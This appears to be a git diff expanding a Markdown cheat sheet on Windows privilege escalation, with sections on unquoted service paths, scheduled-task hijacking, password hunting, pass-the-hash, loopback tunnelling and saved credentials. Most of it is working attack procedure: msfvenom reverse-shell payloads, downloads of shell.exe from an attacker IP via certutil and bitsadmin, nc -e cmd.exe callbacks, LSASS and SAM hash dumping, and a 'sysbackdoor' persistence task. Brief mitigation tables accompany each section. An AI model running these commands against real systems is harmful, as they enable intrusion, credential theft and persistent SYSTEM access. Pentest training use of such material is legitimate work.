@@ -177,6 +177,8 @@ Step	Description
 <details>
 <summary>SeBackupPrivilege</summary>
  <br> 
+ ============================
+ 
 🔑 What is SeBackupPrivilege?
 SeBackupPrivilege is a special Windows permission intended for backup operations.
 
@@ -371,23 +373,107 @@ https://github.com/BeichenDream/GodPotato
 <summary>Unquoted Service Pathss</summary>
  <br> 
 
-----------------------
+================================
 
-Find unquoted service paths:
+🔧 Windows Privilege Escalation – Unquoted Service Path Exploit
+🧠 Concept Summary
+When a Windows service is registered with an unquoted executable path and contains spaces, Windows attempts to locate the executable by parsing the path from left to right, trying each path fragment with .exe appended. If an attacker can write to any of these directories, they can drop a malicious executable and gain privilege escalation when the service is started.
 
-.. code-block:: none
+📌 Prerequisites
+Attacker has low-privileged shell (RDP, reverse shell, etc.)
 
-    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+One or more services have unquoted paths
 
-If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, you can place a binary in any of the following paths:
+Attacker has write permissions to any folder in the service's executable path
 
-.. code-block:: none
+🔍 Step 1: Enumeration
+✅ Using SharpUp (automated):
+powershell
 
-    C:\Program.exe
-    C:\Program Files.exe
-    C:\Program Files\path.exe
-    C:\Program Files\path to.exe
-    C:\Program Files\path to\service.exe
+    .\SharpUp.exe auto
+✅ Using winPEAS (automated):
+powershell
+
+    .\winPEASany.exe all
+<img width="1063" height="472" alt="image" src="https://github.com/user-attachments/assets/87a483f6-856f-44ec-9811-6222e88f6b3e" />
+
+✅ Manually with sc:
+powershell
+
+    sc qc <ServiceName>
+# Example:
+sc qc unquotedsvc
+Look for output like:
+
+<img width="1039" height="338" alt="image" src="https://github.com/user-attachments/assets/ffd807da-a68d-4d6b-910a-7959ebdfa778" />
+
+
+BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\service.exe
+⚠️ Notice the path is unquoted and contains spaces.
+
+✅ Find all unquoted services in one command:
+powershell
+
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+🔍 Step 2: Check Write Permissions
+✅ Use accesschk.exe (from Sysinternals):
+powershell
+
+    accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+🔎 Look for:
+[RW] BUILTIN\Users
+Meaning: any user can write in that directory.
+<img width="992" height="159" alt="image" src="https://github.com/user-attachments/assets/0beb539f-c833-41eb-8ed0-882fb1b87533" />
+
+🎯 Step 3: Exploitation
+✅ Upload Reverse Shell Payload
+powershell
+
+    copy reverse_shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+⚠️ Name the payload according to where Windows would first look.
+For path:
+C:\Program Files\Unquoted Path Service\Common Files\service.exe
+Windows may try:
+
+C:\Program.exe
+
+C:\Program Files.exe
+
+C:\Program Files\Unquoted.exe
+
+C:\Program Files\Unquoted Path.exe
+
+C:\Program Files\Unquoted Path Service\Common.exe ← ✅ our injection point
+
+Choose the earliest writable location in the path.
+
+📞 Step 4: Start Listener (Kali)
+bash
+
+    nc -lvnp 4444
+🚀 Step 5: Trigger the Service
+powershell
+
+    net start unquotedsvc
+🧨 This starts the service and executes your malicious binary.
+🎉 You now have a SYSTEM-level shell.
+<img width="1064" height="321" alt="image" src="https://github.com/user-attachments/assets/27d6c468-3580-405f-b788-1725775f7e2b" />
+
+🔐 Mitigation (Defender Notes)
+Always quote service paths with spaces.
+
+Restrict write permissions on system folders.
+
+Use sc qc, GPO, or PowerShell auditing to periodically scan for misconfigurations.
+
+✅ Checklist Summary
+Task	Command/Tool
+Enumerate Unquoted Paths	wmic, sc qc, SharpUp, winPEAS
+Check Permissions	accesschk.exe
+Upload Payload	copy reverse_shell.exe "Path"
+Start Listener	nc -lvnp 4444
+Start Service	net start <servicename>
+
 
 </details>
 <details>
@@ -395,163 +481,502 @@ If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, yo
  <br> 
  =======================
  
-An attacker can exploit Windows Task Scheduler to schedule malicious programs for initial or recurrent execution. For persistence, the attacker typically uses Windows Task Scheduler to launch applications at system startup or at predefined intervals. Furthermore, the attacker executes remote code under the context of a specified account to achieve Privilege Escalation.
+Windows Task Scheduler allows users to schedule programs or scripts to run at specific times or system events. While this is a legitimate administrative feature, it can be abused by attackers for:
 
-Task Scheduler
- You can easily schedule an automatic job using the Task Scheduler service. When you utilize this service, you set up any program to run at a specific date and time that suits your needs. Subsequently, Task Scheduler evaluates the defined time or event criteria and runs the task once those conditions are met.
+Privilege Escalation: If a scheduled task is executed with higher privileges, an attacker can inject or replace the associated executable to gain SYSTEM-level access.
 
-Abusing Schedule Task/Job
-An attacker can escalate privileges by exploiting Schedule Task/Job. Following an initial foothold, we can query to obtain the list for the scheduled task.
+Persistence: Scheduled tasks can ensure malware or shells re-execute after reboot or on a timed interval.
 
-    schtasks /query /fo LIST /V
-This helps an attack to understand which application is attached to execute Job at what time.
- 
- To obtain a reverse shell as NT Authority SYSTEM, first create a malicious EXE file that a scheduled task can execute. Using Msfvenom, we then generate the EXE file and inject it into the target system accordingly.
+📌 Prerequisites
+Low-privileged access to a Windows machine (e.g., via RDP or reverse shell).
 
-    msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe
-To abuse the scheduled Task, the attacker will either modify the application by overwriting it or may replace the original file from the duplicate. To insert a duplicate file in the same directory, we rename the original file as a file.bak.
+Ability to read/write in directories where scheduled tasks point to executables.
 
-Then downloaded malicious file.exe in the same directory with the help of wget command.
-   
-    powershell wget 192.168.1.3/shell.exe –o file.exe
-Once the duplicate file.exe is injected in the same directory then, the file.exe will be executed automatically through Task Scheduler. As attackers make sure that netcat listener must be at listening mode for obtaining reverse connection for privilege shell.
+OR permissions to create/modify tasks.
 
-    nc -lvp 8888
-    whoami /priv
+🔍 Step 1: Enumerate Scheduled Tasks
+powershell
 
-Detection
-Tools such as Sysinternals[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns] Autoruns can detect system changes like showing presently scheduled jobs.
-Tools like TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview] & Process Explore[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer] may help to identify remote connections for suspicious services or processes.
-View Task Properties and History: To view a task’s properties and history by using a command line
-Schtasks /Query /FO LIST /V
+    schtasks /query /fo LIST /v
+This lists all scheduled tasks in verbose format, including:
 
-Enable the “Microsoft-Windows-TaskScheduler/Operational” configuration inside the event logging service to report scheduled task creation and updates.
+Task Name
+Run As User
+Executable Path
+Schedule
+Task State
+
+📌 Look for:
+
+Tasks run as NT AUTHORITY\SYSTEM
+
+Executables located in user-writable paths (e.g., C:\Users\Public\, C:\ProgramData\, etc.)
+
+🔥 Step 2: Create Malicious Executable (Reverse Shell)
+Using MSFVenom to generate a reverse shell payload:
+
+bash
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=8888 -f exe > shell.exe
+Alternatively (⚙️ Alternative Payload Options):
+
+Persistent Payload (Metasploit Meterpreter):
+
+bash
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f exe > meterpreter.exe
+Custom EXE (compiled C# or PowerShell script using MSBuild):
+
+Use tools like MSBuild, donut, Nim, or C# executables.
+
+🎯 Step 3: Inject Malicious Executable
+Rename Original Executable (optional backup):
+
+powershell
+
+    ren file.exe file.bak
+Download your payload to the same location:
+
+powershell
+
+    powershell -c "Invoke-WebRequest http://192.168.1.3/shell.exe -OutFile file.exe"
+🔁 Alternate download methods:
+
+certutil:
+
+powershell
+
+    certutil -urlcache -split -f http://192.168.1.3/shell.exe file.exe
+bitsadmin:
+
+powershell
+
+    bitsadmin /transfer myDownloadJob /download /priority high http://192.168.1.3/shell.exe C:\Temp\file.exe
+Confirm file is placed and matches original name.
+
+📞 Step 4: Start Netcat Listener on Attacker Machine
+bash
+
+    nc -lvnp 8888
+🕒 Step 5: Wait for the Scheduled Task to Trigger
+On next trigger (e.g., boot time, time interval), your malicious file.exe is executed.
+
+You receive a SYSTEM shell back.
+
+🛡️ Detection & Monitoring
+📌 View Task Scheduler Logs
+Enable Event Log:
+
+    Microsoft-Windows-TaskScheduler/Operational
+Check via Event Viewer:
+
+arduino
+
+    Event ID 106: Task registered
+    Event ID 200: Task started
+    Event ID 201: Task completed
+📌 Task Query for Investigation
+powershell
+
+    schtasks /query /fo LIST /v
+📌 File System Monitoring
+Use tools like:
+
+🔍 Sysinternals Autoruns: Detects auto-starting entries, including scheduled tasks
+Autoruns[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns]
+
+🔍 Process Explorer: Investigates running processes and their privileges
+Process Explorer[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer]
+
+🔍 TCPView: Monitors live TCP/UDP connections
+TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview]
+
+🔀 Alternative Exploitation Scenarios
+Scenario	Description
+Writable Executable Path	Replace task's binary if stored in a writable location (e.g., C:\Users\Public\App.exe)
+Create New Task (if user has rights)	Use schtasks /create to create a task running as SYSTEM
+DLL Hijacking via Scheduled Task	If the task binary loads unmanaged DLLs unsafely, inject your malicious DLL
+Startup Triggers	Abuse AtLogon, OnStartup, Daily triggers for persistence
+Via COM objects / PowerShell WMI	Create tasks silently using PowerShell:
+
+powershell
+
+    $action = New-ScheduledTaskAction -Execute "shell.exe"
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistTask" -User "SYSTEM"
+🔐 Mitigation Techniques
+Defense	Description
+Least Privilege Principle	Restrict ability to create/modify tasks to admin users only
+Monitor Task Changes	Enable auditing of TaskScheduler logs
+Protect File System	Secure executable paths used by tasks
+Application Whitelisting	Prevent unauthorized executables (e.g., via AppLocker)
+Regular Review	Periodic manual or automated audits of scheduled tasks
+
+✅ Summary
+Task	Command/Tool
+Enumerate Tasks	schtasks /query /fo LIST /v
+Create Payload	msfvenom -p windows/shell_reverse_tcp ...
+Upload Payload	powershell wget, certutil, bitsadmin
+Setup Listener	nc -lvnp <port>
+Detect/Investigate	Event Viewer, Autoruns, Process Explorer, Sysmon
 </details>
+
 <details>
 <summary>Cleartext Passwords</summary>
  <br> 
 
 ===================
+After gaining initial access to a Windows system, attackers often look for cleartext or weakly encrypted passwords stored in configuration files, registry keys, or leftover deployment scripts. These credentials can lead to privilege escalation or access to other systems in the network.
 
-Find passwords in arbitrary files:
-
-.. code-block:: none
+🔎 1. Search for Passwords in Files
+✅ Search common keywords in common text files:
+cmd
 
     findstr /si password *.txt *.xml *.ini
+Searches for password (case-insensitive) in .txt, .xml, and .ini files.
 
-Find strings in filenames:
-
-.. code-block:: none
-
-    dir /s *pass* == *cred* == *vnc* == *.config*
-
-Find passwords in all files:
-
-.. code-block:: none
+✅ Search all files for keywords like password:
+cmd
 
     findstr /spin "password" *.*
+/s: recurse subdirectories
+/p: skip binary files
+/i: case-insensitive
+/n: include line numbers
 
-Common files which contain passwords:
+✅ Search for filenames suggesting stored credentials:
 
-.. code-block:: none
+    dir /s *pass* == *cred* == *vnc* == *.config*
+Looks for files that likely contain credentials in their names.
 
-    type c:\sysprep.inf
-    type c:\sysprep\sysprep.xml
-    type c:\unattend.xml
+🔁 Alternative Filename Searches:
+
+cmd
+
+    dir /s /b *pass*.*  
+    dir /s /b *cred*.*  
+    dir /s /b *secret*.*  
+    dir /s /b *.config  
+    dir /s /b *.ini  
+🗂️ 2. Check Known Files Containing Credentials
+These files are often left over from Windows installations, third-party applications, or RDP/VNC tools:
+
+cmd
+
+    type C:\sysprep.inf
+    type C:\sysprep\sysprep.xml
+    type C:\unattend.xml
     type %WINDIR%\Panther\Unattend\Unattended.xml
     type %WINDIR%\Panther\Unattended.xml
-    dir c:*vnc.ini /s /b
-    dir c:*ultravnc.ini /s /b
-    dir c:\ /s /b | findstr /si *vnc.ini
+💡 These often contain Local Admin credentials used during unattended Windows installations.
 
-Search for passwords in the registry:
+📂 3. Look for Remote Desktop & VNC Credentials
 
-.. code-block:: none
+    dir C:\*vnc.ini /s /b
+    dir C:\*ultravnc.ini /s /b
+    dir C:\ /s /b | findstr /si *vnc.ini
+VNC applications often store saved passwords in these .ini files (sometimes base64 or weak XOR encoding).
+
+🔁 Alternatives:
+
+tightvnc.ini
+realvnc.ini
+*.rdp files
+
+🧬 4. Search the Windows Registry for Stored Passwords
+🔍 Search entire registry hives:
 
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s
-    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+🔎 Scans for REG_SZ values containing password.
+
+🔎 Targeted Registry Keys
+
+    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+Look for DefaultPassword, AutoAdminLogon, etc. Can be used to autologin as local admin.
+
+cmd
+
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
+SNMP community strings may be stored here (used for network equipment access).
+
     reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+PuTTY session passwords, IPs, saved usernames – can be decoded from registry manually or using tools like putty-creds.
+
+    reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
+RealVNC stores encrypted passwords here. Can be cracked with tools like vncpwd.
+
+💡 Extra Tip: Use PowerShell for Enhanced File Search
+powershell
+
+    Get-ChildItem -Recurse -Include *.xml,*.txt,*.ini -Path C:\ | 
+    Select-String -Pattern "password" -SimpleMatch
+More efficient and readable than findstr, especially with large directories.
+
+📂 Locations Often Containing Secrets
+Path	Description
+C:\Users\<user>\AppData\Roaming\	App data, often includes creds
+C:\ProgramData\	Global config files
+C:\inetpub\wwwroot\	Web apps with DB connection strings
+.git directories	May include .env, configs, hardcoded secrets
+.rdp files	Remote Desktop files may store credentials
+web.config, app.config	.NET config files with plaintext DB strings
+
+🧰 Helpful Tools (Optional)
+🛠️ Windows Credential Editor (WCE) – Dumps stored credentials.
+🔎 LaZagne – Searches for stored passwords from various apps.
+🧪 Mimikatz – Extracts plaintext credentials, tokens, and hashes from memory.
+🔐 Secretsdump.py (Impacket) – Dumps credentials remotely via SMB.
+🧾 NirSoft tools – GUI tools for saved browser, RDP, Outlook, etc., passwords.
+
+🔐 Detection & Defense
+Defense Strategy	Description
+File Auditing	Monitor access to sensitive config and .xml, .ini, .rdp files
+Registry Auditing	Use Sysmon + Event Logging to monitor suspicious registry access
+Credential Scanning Tools	Use tools like truffleHog, gitleaks, or Stealthbits to scan systems/repos for secrets
+Least Privilege	Avoid storing passwords in plaintext where possible, and restrict read permissions
+Credential Manager	Use Windows Credential Locker or LSA to securely store secrets
+
+✅ Summary Table
+Task	Command
+Find password in text files	findstr /si password *.txt *.xml *.ini
+Search all files for keywords	findstr /spin "password" *.*
+Search filenames	dir /s *pass*.*
+Check common files	type c:\unattend.xml, etc.
+Check registry	reg query HKLM /f password /t REG_SZ /s
+PuTTY sessions	reg query HKCU\Software\SimonTatham\PuTTY\Sessions
+VNC keys	reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
+
 
 </details>
 <details>
 <summary>Passing the Hash</summary>
  <br> 
 ================
+Passing the Hash is a post-exploitation technique that allows an attacker to authenticate using NTLM hashes without knowing the actual plaintext password. Instead of cracking hashes, the attacker reuses them directly to gain remote or local access under another user’s (typically admin) context.
 
-The following commands can be used to dump password hashes:
+🔍 Step 1: Dump NTLM Password Hashes
+To perform PtH, you first need access to NTLM hashes. These can be obtained using credential-dumping tools:
 
-.. code-block:: none
+✅ Common Hash Dumping Tools
+cmd
 
     wce32.exe -w
     wce64.exe -w
     fgdump.exe
+🧰 Alternative Hash Dumpers:
 
-Remote
-------
+mimikatz.exe – Powerful credential extraction tool:
 
-Pass the hash remotely to gain a shell:
+powershell
 
-.. code-block:: none
+    sekurlsa::logonpasswords
+lsass.dmp with secretsdump.py:
 
-    pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd
+bash
 
-Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):
+    procdump64.exe -ma lsass.exe lsass.dmp
+    secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
+LaZagne – Extracts saved creds from many apps
 
-.. code-block:: none
+🌐 Passing the Hash – Remote Execution
+Once you have an NTLM hash, you can use it to remotely authenticate and execute commands on other systems.
 
-    pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd
+✅ Using pth-winexe
+bash
 
-Alternative:
+    pth-winexe -U <domain>/<username>%<NTLM_hash> //<target-ip> cmd
+🚩 Use Administrator or other privileged accounts for best results.
 
-.. code-block:: none
+📌 Target Hostname Instead of IP
 
-    export SMBHASH=<hash>
+Some systems may require NetBIOS name resolution:
+
+bash
+
+    pth-winexe -U <domain>/<username>%<hash> //<hostname> cmd
+🛠️ If hostname doesn't resolve, edit /etc/hosts:
+
+php-template
+
+    <target-ip>  <hostname>
+✅ Using Environment Variable SMBHASH (Alternate Method)
+bash
+
+    export SMBHASH=<LM_hash>:<NTLM_hash>
     pth-winexe -U <domain>/<username>% //<target-ip> cmd
+Useful if only one hash type is available (LM or NTLM).
 
-Local
------
+🧠 Tip: If LM hash is not used, you can leave it as 00000000000000000000000000000000
 
-Pass the hash locally using runas:
+✅ Using impacket's wmiexec.py or psexec.py
+bash
 
-.. code-block:: none
+    psexec.py -hashes :<NTLM_hash> <domain>/<user>@<ip>
+    wmiexec.py -hashes :<NTLM_hash> <domain>/<user>@<ip>
+🔁 Use -k or -no-pass flags depending on your setup.
 
-    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
+🖥️ Passing the Hash – Local Execution
+In some cases, you can use the NTLM hash locally on the same machine where the hash was dumped to escalate privileges.
 
-Pass the hash locally using PowerShell:
+✅ Using runas (Custom Build for PtH)
+⚠️ Windows' built-in runas.exe does not support PtH natively. This method works only with modified or patched versions (e.g., via PowerShell Empire or tools like RunasCs).
 
-.. code-block:: none
+cmd
 
-    secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
-    mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-    computer = "<hostname>"
+    runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
+🧠 Note: You may need SeTcbPrivilege or SYSTEM-level context to impersonate other users with hashes locally.
+
+✅ Using PowerShell (via Secure Strings)
+powershell
+
+    $secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
+    $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+    $computer = "<hostname>"
     [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+⚠️ Limitation: This works with plaintext passwords, not hashes. For actual PtH, use Invoke-WMIExec or similar.
 
-Pass the hash locally using psexec:
-
-.. code-block:: none
+✅ Using PsExec (with hash)
+cmd
 
     psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
+Requires PsExec variant that supports PtH (e.g., in Sysinternals, Impacket, or custom fork).
+
+🔁 Alternative Tools & Methods
+Tool	Description
+Impacket psexec.py / wmiexec.py	Native support for PtH
+Evil-WinRM	Can authenticate with hashes, useful for remote shells
+Invoke-WMIExec	PowerShell script for remote command execution
+CrackMapExec	Swiss army knife for SMB enumeration + PtH
+Rubeus	Can pass TGT tickets for lateral movement (Kerberos equivalent)
+Smbexec	Wrapper for smbclient to execute using hashes
+
+🧪 Example: Remote Shell via pth-winexe
+bash
+
+    pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_hash> //192.168.1.5 cmd
+Result: Interactive cmd.exe shell as Administrator on the remote system.
+
+🛡️ Detection & Mitigation
+Defense Strategy	Description
+🧼 Disable NTLM	Disable or limit NTLM authentication via GPO
+🔐 Enforce SMB Signing	Prevents tampering with SMB messages
+🔎 Log Event IDs	Monitor logs: 4624, 4648, 4776 for unusual logins
+🔍 Monitor Tools	Detect usage of pth-*, psexec, mimikatz, etc.
+🔒 Credential Guard	Protects LSASS from being dumped
+📊 Use Sysmon	Track process creation + network connections
+
+✅ Summary Cheat Sheet
+Purpose	Command
+Dump hashes (WCE)	wce64.exe -w
+Remote PtH	pth-winexe -U domain/user%hash //ip cmd
+Local PtH (PsExec)	psexec64 \\host -u user -p hash -h command
+Set SMBHASH	export SMBHASH=LM:NTLM
+Remote PtH (Impacket)	psexec.py -hashes :NTLM domain/user@ip
+
 
 </details>
 <details>
 <summary>Loopback Services</summary>
  <br> 
 =================
+Loopback services are applications or services listening on 127.0.0.1 (localhost) only, meaning they cannot be accessed from outside the machine by default. However, if an attacker has local access (e.g., reverse shell, RDP, or low-privileged foothold), these internal services can be proxied or forwarded externally, and then abused — for example, to exploit internal APIs, web interfaces, or escalate privileges.
 
-Search for services listening on the loopback interface:
+🔍 Step 1: Identify Loopback Services
+Use netstat to check for services bound only to 127.0.0.1 (localhost):
 
-.. code-block:: none
+cmd
 
     netstat -ano | findstr "LISTEN"
+🔍 Look for entries like:
 
-Use plink.exe to forward the loopback port to a port on our attacking host (via SSH):
+nginx
 
-.. code-block:: none
+    TCP    127.0.0.1:8000    0.0.0.0:0    LISTENING    1234
+Port 8000 is only available on loopback.
+
+PID 1234 may correspond to a high-privilege service like an internal web API.
+
+✅ Identify the service name behind the PID:
+cmd
+
+    tasklist /fi "PID eq 1234"
+🔁 Step 2: Port Forward the Loopback Service to Attacker
+You can remotely expose the local-only service using port forwarding over an SSH tunnel with plink.exe.
+
+✅ Using plink.exe (SSH Reverse Tunnel):
+cmd
 
     plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>
+🔁 Example:
+cmd
+
+    plink.exe -l kali -pw P@ssw0rd 192.168.1.100 -R 9000:127.0.0.1:8000
+This binds port 9000 on your attacking machine to the victim’s internal port 8000 (localhost). Now you can open http://localhost:9000 on your attacker box to access the internal service.
+
+⚙️ Use Cases
+Use Case	Example
+🧪 Exploit internal web apps	HTTP admin panels only listening on 127.0.0.1
+🔄 Abuse local privileged APIs	Exploit services like Jenkins, Redis, MySQL bound to localhost
+📦 Pivot into internal systems	Forward 127.0.0.1:3306 (MySQL) and reuse credentials
+🔐 Extract secrets	Vaults, config servers, DB admin panels (e.g., Mongo Express)
+
+🛠️ Alternatives to plink.exe
+✅ ssh from Linux (native):
+bash
+
+    ssh -R 9000:127.0.0.1:8000 attacker@attacker-ip
+✅ chisel (More advanced tunneling over HTTP):
+bash
+
+# On attacker:
+    chisel server -p 9001 --reverse
+
+# On victim:
+    chisel client attacker-ip:9001 R:9000:127.0.0.1:8000
+✅ socat (bidirectional proxying):
+bash
+
+    socat TCP-LISTEN:9000,fork TCP:127.0.0.1:8000
+✅ Invoke-SSHCommand / PSSession (PowerShell Remoting):
+For environments with WinRM enabled:
+
+powershell
+
+    Enter-PSSession -ComputerName target -Credential $creds
+    New-NetFirewallRule -DisplayName "Allow SSH Tunnel" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow
+🔐 Detection & Defense
+Detection Technique	Description
+🔍 Monitor Netstat Output	Look for services bound to 127.0.0.1
+🧪 Check for Reverse SSH	Monitor plink.exe, ssh.exe, or chisel.exe processes
+📊 Enable Sysmon Logging	Monitor for unusual child process or network connections
+🔒 Restrict Loopback Services	Configure services to require authentication even on loopback
+🛡️ Egress Filtering	Block outbound SSH, chisel, or tunneling ports
+🧰 Use Application Firewalls	Restrict access to internal-only services using local firewalls
+
+🧪 Example Scenario
+✅ Find a local service:
+pgsql
+
+    127.0.0.1:8888 - PID 4321 - Web API for internal admin panel
+✅ Tunnel it to attacker machine:
+cmd
+
+    plink.exe -l kali -pw kali 192.168.1.100 -R 8080:127.0.0.1:8888
+✅ On Kali (attacker):
+bash
+
+    curl http://localhost:8080
+💥 You now access a privileged local service remotely, possibly leading to RCE, token theft, or privilege escalation.
+
+✅ Summary Cheat Sheet
+Task	Command
+List local ports	`netstat -ano
+Identify process by PID	tasklist /fi "PID eq <pid>"
+Tunnel with plink	plink.exe -R <LPORT>:127.0.0.1:<RPORT>
+Tunnel with SSH	ssh -R <LPORT>:127.0.0.1:<RPORT> user@attacker-ip
+Tunnel with chisel	chisel client attacker-ip:port R:...
+
 
 </details>
 <details>
@@ -665,23 +1090,89 @@ bash
 
 ==================
 
-If there are stored credentials, we can run commands as that user:
+Windows allows users to store credentials in the system using Credential Manager or via commands like runas /savecred. These credentials are saved in a user-specific vault and may be reused by any user with access to the same session. If the /savecred option was used earlier or credentials were saved via GUI, they can be leveraged to execute commands under higher-privileged contexts without re-entering passwords.
 
-.. code-block:: none
+🔍 Step 1: Enumerate Stored Credentials
+Use the built-in cmdkey.exe utility to view stored credentials:
 
-    $ cmdkey /list
+cmd
 
+    cmdkey /list
+🔎 Sample Output:
+
+    yaml
     Currently stored credentials:
 
     Target: Domain:interactive=PWNED\Administrator
     Type: Domain Password
     User: PWNED\Administrator
+✅ This shows that the user PWNED\Administrator has saved credentials available for use.
 
-Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:
+🚀 Step 2: Execute Commands Using Saved Credentials
+Use runas with the /savecred flag to reuse stored credentials without retyping the password:
 
-.. code-block:: none
+cmd
 
+    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <port> -e cmd.exe"
+💡 runas spawns the command as the specified user. If /savecred is used and credentials were saved earlier, the prompt is skipped.
 
-    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"
+🧠 Note:
+
+/savecred does not store credentials — it reuses previously saved ones.
+
+You must provide full absolute paths for commands.
+
+💥 Real-World Exploitation Example
+User Administrator has previously saved credentials.
+
+You run:
+
+cmd
+
+    runas /user:Administrator /savecred "C:\Windows\System32\cmd.exe"
+You now have a shell running as Administrator, no password required.
+
+🔁 Alternatives & Enhancements
+✅ Use PsExec (if credentials were saved elsewhere or token is available):
+cmd
+
+    psexec.exe -u PWNED\Administrator -p <known-password> cmd.exe
+Or combine with hashes if using Pass-the-Hash scenarios.
+
+✅ Use PowerShell to Elevate:
+powershell
+
+    Start-Process "cmd.exe" -Credential (New-Object System.Management.Automation.PSCredential("PWNED\Administrator",(ConvertTo-SecureString "Dummy" -AsPlainText -Force)))
+⚠️ Only works if plaintext password is known. Doesn’t support /savecred.
+
+✅ Use Task Scheduler for Persistent Elevation:
+cmd
+
+    schtasks /create /tn "sysbackdoor" /tr "cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> 4444 -e cmd.exe" /sc once /st 00:00 /ru "PWNED\Administrator" /RL HIGHEST /F
+Leverages stored creds if previously authenticated with this account.
+
+🛡️ Detection & Defense
+Defense	Description
+🔍 Monitor cmdkey.exe usage	Unusual calls can indicate enumeration
+📊 Detect runas /savecred usage	Enable command-line logging (e.g., Sysmon Event ID 1)
+🔒 Limit use of /savecred	Enforce GPO to block its usage
+🔐 Clear saved credentials	Use cmdkey /delete:<target> to remove saved entries
+👁️ Monitor for runas.exe and scheduled task abuse	High-privilege task execution by low-privileged users is a red flag
+
+🧹 Optional Cleanup
+Clear stored credentials after use:
+
+cmd
+
+    cmdkey /delete:Domain:interactive=PWNED\Administrator
+This deletes the saved credential and prevents re-use by attackers.
+
+✅ Summary Cheat Sheet
+Task	Command
+View stored creds	cmdkey /list
+Run with saved creds	runas /user:<user> /savecred "<command>"
+Clear saved creds	cmdkey /delete:<target>
+Elevate via PsExec	psexec -u <user> -p <password> cmd.exe
+Schedule task w/ creds	schtasks /create ... /ru <user>
 
    </details>
